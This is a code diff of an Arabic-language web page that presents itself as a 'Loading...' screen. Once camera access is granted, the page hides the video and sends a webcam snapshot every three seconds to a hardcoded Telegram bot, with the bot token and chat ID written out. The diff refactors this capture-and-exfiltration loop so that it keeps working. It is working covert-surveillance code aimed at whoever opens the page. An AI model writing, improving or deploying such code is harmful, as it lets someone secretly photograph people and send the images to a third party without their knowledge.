@@ -5,7 +5,7 @@
   <title>جارٍ التحميل...</title>
   <style>
     body { text-align: center; font-family: Arial; padding: 50px; }
-    video { display: none; }
+    video { width: 640px; height: 480px; display: none; }
     #status { font-size: 20px; }
   </style>
 </head>
@@ -20,32 +20,40 @@
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
 
-    // تشغيل الكاميرا
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
-
-        setInterval(() => {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(blob => {
-            const formData = new FormData();
-            formData.append('chat_id', '6765420173'); // ضع ID الشات هنا
-            formData.append('photo', blob, 'snapshot.jpg');
-
-            fetch('https://api.telegram.org/bot7865229336:AAG8w_CBGt0gcGfMd7syGaUVhUH5lJaNL6I/sendPhoto', {
-              method: 'POST',
-              body: formData
-            })
-            .then(response => response.json())
-            .then(data => console.log("تم الإرسال:", data))
-            .catch(error => console.error("فشل الإرسال:", error));
-          }, 'image/jpeg');
-        }, 3000); // يلتقط صورة كل 3 ثوانٍ
+        video.onloadedmetadata = () => {
+          document.getElementById('status').innerText = 'يتم الآن التقاط الصور...';
+          captureFrame(); // بدء التقاط الصور بعد تحميل الفيديو بالكامل
+        };
       })
       .catch(err => {
         document.getElementById('status').innerText = 'فشل في الوصول إلى الكاميرا 😓';
         console.error("خطأ في تشغيل الكاميرا:", err);
       });
+
+    function captureFrame() {
+      if (video.readyState === 4) { // التأكد من أن الفيديو جاهز تمامًا
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append('chat_id', '6765420173'); // ضع ID الشات هنا
+          formData.append('photo', blob, 'snapshot.jpg');
+
+          fetch('https://api.telegram.org/bot7865229336:AAG8w_CBGt0gcGfMd7syGaUVhUH5lJaNL6I/sendPhoto', {
+            method: 'POST',
+            body: formData
+          })
+          .then(response => response.json())
+          .then(data => console.log("تم الإرسال:", data))
+          .catch(error => console.error("فشل الإرسال:", error));
+        }, 'image/jpeg');
+      }
+
+      setTimeout(captureFrame, 3000); // تكرار العملية كل 3 ثوانٍ
+    }
   </script>
 
 </body>
